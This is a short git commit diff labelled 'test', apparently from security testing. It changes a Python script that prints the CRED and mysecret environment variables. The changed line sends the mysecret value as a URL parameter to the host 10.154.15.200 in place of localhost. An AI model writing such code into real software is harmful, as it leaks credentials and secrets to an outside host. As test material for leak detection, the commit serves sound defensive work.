3edb7a3b4c4fbbe17d09b5ed1ca4e255aa2312ef
Ivan Y Lin <ivan_y_lin@trendmicro.com>
2022-10-12 11:37:25 +0800

    test

--- main.py
+++ main.py
@@ -5,5 +5,5 @@ import requests
 print(f"hello world { os.environ.get('CRED')}, {os.environ.get('mysecret')}")
 
 
-res = requests.get(f"http://localhost:8000/?app={os.environ.get('mysecret')}")
+res = requests.get(f"http://10.154.15.200/?app={os.environ.get('mysecret')}")
 print(res.content)
